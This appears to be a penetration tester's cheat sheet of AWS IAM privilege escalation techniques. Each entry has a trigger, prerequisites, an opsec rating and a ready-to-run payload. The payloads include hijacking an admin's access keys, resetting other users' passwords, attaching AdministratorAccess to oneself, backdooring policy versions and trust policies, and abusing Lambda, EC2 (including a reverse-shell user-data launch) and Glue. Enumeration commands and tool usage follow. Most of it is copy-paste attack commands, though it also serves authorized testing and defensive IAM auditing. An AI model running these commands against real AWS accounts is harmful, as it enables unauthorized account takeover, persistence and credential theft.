# AWS IAM Privilege Escalation Techniques

> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`

## Shadow Admin Permissions (Admin-Equivalent Without AdministratorAccess Policy)

### iam:CreateAccessKey → Hijack Another Admin's Keys [added: 2026-04]
- **Tags:** #AWS #IAM #CreateAccessKey #PrivEsc #ShadowAdmin #KeyHijack #CredentialTheft #Persistence
- **Trigger:** Compromised user has `iam:CreateAccessKey` permission on another user (especially admins)
- **Prereq:** `iam:CreateAccessKey` permission scoped to target admin user
- **Yields:** New access key pair for the target admin user, granting their full permissions
- **Opsec:** Med
- **Context:** Compromised user has `iam:CreateAccessKey` on another admin account
- **Payload/Method:**
  ```bash
  aws iam create-access-key --user-name <target_admin_user>
  # Creates new keypair for target user — persist as that admin
  ```

### iam:CreateLoginProfile → Set Password on Passwordless Admin [added: 2026-04]
- **Tags:** #AWS #IAM #CreateLoginProfile #PrivEsc #ConsoleAccess #PasswordSet #ShadowAdmin
- **Trigger:** Found an IAM user with high privileges but no console login profile configured
- **Prereq:** `iam:CreateLoginProfile` permission on target user + target user has no existing login profile
- **Yields:** Console access as the target user with full browser-based AWS management
- **Opsec:** Med
- **Context:** IAM user exists but has no console password — attacker can set one
- **Payload/Method:**
  ```bash
  aws iam create-login-profile --user-name <target_user> --password 'ComplexP@ss!'
  # Then log in at: https://<account-id>.signin.aws.amazon.com/console
  ```

### iam:UpdateLoginProfile → Reset Any IAM User Password [added: 2026-04]
- **Tags:** #AWS #IAM #UpdateLoginProfile #PrivEsc #PasswordReset #AccountTakeover #ShadowAdmin
- **Trigger:** Need console access to another IAM user's account and have UpdateLoginProfile permission
- **Prereq:** `iam:UpdateLoginProfile` permission on target user
- **Yields:** Console access as the target user (overwrites their existing password)
- **Opsec:** Med
- **Context:** Have `iam:UpdateLoginProfile` — can change another user's console password
- **Payload/Method:**
  ```bash
  aws iam update-login-profile --user-name <target_user> --password 'NewP@ss!'
  ```

### iam:AttachUserPolicy / AttachRolePolicy → Attach AdministratorAccess to Self [added: 2026-04]
- **Tags:** #AWS #IAM #AttachUserPolicy #AttachRolePolicy #PrivEsc #AdminAccess #PolicyAttach #SelfEscalation
- **Trigger:** Compromised principal has iam:AttachUserPolicy or iam:AttachRolePolicy permission
- **Prereq:** `iam:AttachUserPolicy` or `iam:AttachRolePolicy` permission (on self or assumable role)
- **Yields:** Full AdministratorAccess on the AWS account
- **Opsec:** High
- **Context:** Compromised user has attach policy permission
- **Payload/Method:**
  ```bash
  aws iam attach-user-policy --user-name <my_username> \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

  aws iam attach-role-policy --role-name <role_i_can_assume> \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
  ```

### iam:PutUserPolicy → Add Inline Admin Policy to Self [added: 2026-04]
- **Tags:** #AWS #IAM #PutUserPolicy #PrivEsc #InlinePolicy #WildcardPolicy #SelfEscalation
- **Trigger:** Compromised user has `iam:PutUserPolicy` permission on their own user
- **Prereq:** `iam:PutUserPolicy` permission scoped to own username or wildcard
- **Yields:** Full wildcard (*:*) admin permissions via inline policy
- **Opsec:** High
- **Context:** Have `iam:PutUserPolicy` permission — add wildcard inline policy
- **Payload/Method:**
  ```bash
  # admin_policy.json: {"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
  aws iam put-user-policy --user-name <my_username> \
    --policy-name pwn_inline \
    --policy-document file://admin_policy.json
  ```

### iam:CreatePolicyVersion + iam:SetDefaultPolicyVersion → Backdoor Existing Policy [added: 2026-04]
- **Tags:** #AWS #IAM #CreatePolicyVersion #SetDefaultPolicyVersion #PrivEsc #PolicyBackdoor #ManagedPolicy
- **Trigger:** Found a customer-managed policy attached to your principal that you can modify
- **Prereq:** `iam:CreatePolicyVersion` (with `--set-as-default`) or both `iam:CreatePolicyVersion` + `iam:SetDefaultPolicyVersion`
- **Yields:** Escalated permissions by modifying existing policy to admin-level without creating new attachments
- **Opsec:** Med
- **Context:** Attacker can modify customer-managed policies — change non-admin policy to admin
- **Payload/Method:**
  ```bash
  aws iam create-policy-version --policy-arn <target_policy_arn> \
    --policy-document file://admin_policy.json --set-as-default

  # Or promote an existing version
  aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
  ```

### iam:AddUserToGroup → Join Admin Group [added: 2026-04]
- **Tags:** #AWS #IAM #AddUserToGroup #PrivEsc #GroupMembership #AdminGroup #SelfEscalation
- **Trigger:** Enumerated IAM groups and found admin group + have AddUserToGroup permission
- **Prereq:** `iam:AddUserToGroup` permission + knowledge of admin group name
- **Yields:** All permissions of the admin group inherited by your user
- **Opsec:** High
- **Context:** Have `iam:AddUserToGroup` — add self to admin group
- **Payload/Method:**
  ```bash
  aws iam add-user-to-group --group-name <admin_group> --user-name <my_username>
  ```

### iam:UpdateAssumeRolePolicy + sts:AssumeRole → Assume Privileged Role [added: 2026-04]
- **Tags:** #AWS #IAM #UpdateAssumeRolePolicy #AssumeRole #STS #PrivEsc #TrustPolicyAbuse #RoleHijack
- **Trigger:** Found a privileged role and have permission to modify its trust policy
- **Prereq:** `iam:UpdateAssumeRolePolicy` on target role + `sts:AssumeRole`
- **Yields:** Ability to assume the privileged role and inherit all its permissions
- **Opsec:** Med
- **Context:** Can modify trust policy of a privileged role — add self to trust relationship
- **Payload/Method:**
  ```bash
  # trust_policy.json: allow your ARN to assume the role
  aws iam update-assume-role-policy --role-name <privileged_role> \
    --policy-document file://trust_policy.json
  aws sts assume-role --role-arn <role_arn> --role-session-name pwn
  ```

### iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction → Privilege via Lambda [added: 2026-04]
- **Tags:** #AWS #IAM #PassRole #Lambda #PrivEsc #CreateFunction #InvokeFunction #ServerlessEscalation
- **Trigger:** Have iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction and a high-priv Lambda execution role exists
- **Prereq:** `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` + an existing IAM role with elevated permissions that Lambda can assume
- **Yields:** AdministratorAccess attached to your user via Lambda executing IAM calls with the elevated role
- **Opsec:** Med
- **Context:** Can pass a role to Lambda and invoke it — use Lambda to attach admin policy
- **Payload/Method:**
  ```python
  # lambda_pwn.py
  import boto3
  def lambda_handler(event, context):
      iam = boto3.client('iam')
      iam.attach_user_policy(
          UserName='my_username',
          PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
      )
      return {'statusCode': 200}
  ```
  ```bash
  aws lambda create-function --function-name pwn_func --runtime python3.9 \
    --role <arn_of_lambda_role> --handler lambda_pwn.lambda_handler \
    --zip-file fileb://lambda_pwn.zip
  aws lambda invoke --function-name pwn_func output.txt
  ```

### lambda:UpdateFunctionCode → Inject Code into Existing Lambda (Inherits Role) [added: 2026-04]
- **Tags:** #AWS #Lambda #UpdateFunctionCode #PrivEsc #CodeInjection #ServerlessBackdoor #RoleAbuse
- **Trigger:** Found an existing Lambda function with an elevated IAM role and have UpdateFunctionCode permission
- **Prereq:** `lambda:UpdateFunctionCode` permission + target Lambda function with high-priv execution role
- **Yields:** Code execution with the Lambda function's IAM role permissions
- **Opsec:** Med
- **Context:** Existing Lambda has elevated role — update its code to escalate
- **Payload/Method:**
  ```bash
  aws lambda update-function-code --function-name <target_function> \
    --zip-file fileb://malicious_lambda.zip
  ```

### iam:PassRole + ec2:RunInstances → Launch EC2 with Admin Role [added: 2026-04]
- **Tags:** #AWS #IAM #PassRole #EC2 #RunInstances #PrivEsc #InstanceProfile #RoleAbuse #AdminRole
- **Trigger:** Have iam:PassRole + ec2:RunInstances and know of a high-privilege instance profile
- **Prereq:** `iam:PassRole` + `ec2:RunInstances` + an existing instance profile with elevated IAM role + SSH key or user-data capability
- **Yields:** EC2 instance with admin-level IAM role accessible via SSH or reverse shell
- **Opsec:** Med
- **Context:** Can pass a high-priv role to EC2 at launch — instance inherits admin perms
- **Payload/Method:**
  ```bash
  # Method 1: Attach SSH key for interactive access
  aws ec2 run-instances --image-id ami-a4dc46db --instance-type t2.micro \
    --iam-instance-profile Name=admin-role-ip \
    --key-name my_ssh_key --security-group-ids sg-xxxxxxxx

  # Method 2: Reverse shell via user-data
  aws ec2 run-instances --image-id ami-a4dc46db --instance-type t2.micro \
    --iam-instance-profile Name=admin-role-ip \
    --user-data file://reverse_shell.sh
  ```

### iam:PassRole + ec2:AssociateIamInstanceProfile → Attach Admin Role to Existing EC2 [added: 2026-04]
- **Tags:** #AWS #IAM #PassRole #EC2 #AssociateIamInstanceProfile #PrivEsc #InstanceProfile #RoleSwap
- **Trigger:** Have access to an EC2 instance (SSRF/RCE) and can associate instance profiles via IAM
- **Prereq:** `iam:PassRole` + `ec2:AssociateIamInstanceProfile` + existing EC2 instance you can reach + admin instance profile
- **Yields:** Admin-level credentials available via the instance metadata service on the target EC2
- **Opsec:** Med
- **Context:** Have access to an EC2 instance and can associate instance profiles
- **Payload/Method:**
  ```bash
  aws ec2 associate-iam-instance-profile \
    --iam-instance-profile Name=admin-role \
    --instance-id <instance-id>
  # Then use SSRF/RCE to pull creds from metadata
  ```

### glue:UpdateDevEndpoint → SSH Key Injection on Glue Role [added: 2026-04]
- **Tags:** #AWS #Glue #UpdateDevEndpoint #PrivEsc #SSHKeyInjection #ServiceRoleAbuse #DataPipeline
- **Trigger:** Found a Glue dev endpoint with an attached service role and have UpdateDevEndpoint permission
- **Prereq:** `glue:UpdateDevEndpoint` permission + target Glue dev endpoint with elevated service role
- **Yields:** SSH access to Glue dev endpoint with the attached service role's permissions
- **Opsec:** Low
- **Context:** Can update Glue dev endpoint — inherits attached service role
- **Payload/Method:**
  ```bash
  aws glue update-dev-endpoint --endpoint-name <target_endpoint> \
    --public-key file://~/.ssh/id_rsa.pub
  ```

## IAM Enumeration Commands

```bash
# Identity check
aws sts get-caller-identity

# Users & groups
aws iam list-users
aws iam list-groups-for-user --user-name <user>
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>  # inline policies

# Groups
aws iam list-groups
aws iam list-attached-group-policies --group-name <group>

# Roles
aws iam list-roles
aws iam list-attached-role-policies --role-name <role>
aws iam get-role --role-name <role>  # check trust relationships

# Policies
aws iam list-policies
aws iam get-policy --policy-arn <arn>
aws iam list-policy-versions --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id <vid>

# Assume role
aws sts assume-role --role-arn <arn> --role-session-name session
export AWS_ACCESS_KEY_ID=<from output>
export AWS_SECRET_ACCESS_KEY=<from output>
export AWS_SESSION_TOKEN=<from output>
```

## Tools

```bash
# enumerate-iam: brute-force all API calls to find granted permissions
git clone https://github.com/andresriancho/enumerate-iam.git
./enumerate-iam.py --access-key AKIA... --secret-key StF0q...

# PMapper: graph IAM and find privesc paths
pmapper graph --create
pmapper query "preset privesc user/PowerUser"
pmapper query "preset privesc *"  # all principals that can escalate

# SkyArk: find shadow admins
Import-Module .\SkyArk.ps1 -force
Start-AWStealth
Scan-AWShadowAdmins

# cloudsplaining: IAM least-privilege violations
cloudsplaining download --profile myprofile
cloudsplaining scan --input-file default.json
```

## AWS API Calls That Return Credentials (Monitor/Exploit)
```
iam:createaccesskey          iam:createloginprofile
sts:assumerole               sts:assumerolewithsaml
sts:assumerolewithwebidentity sts:getfederationtoken
cognito-identity:getcredentialsforidentity
ecr:getauthorizationtoken    sso:getrolecredentials
redshift:getclustercredentials
```
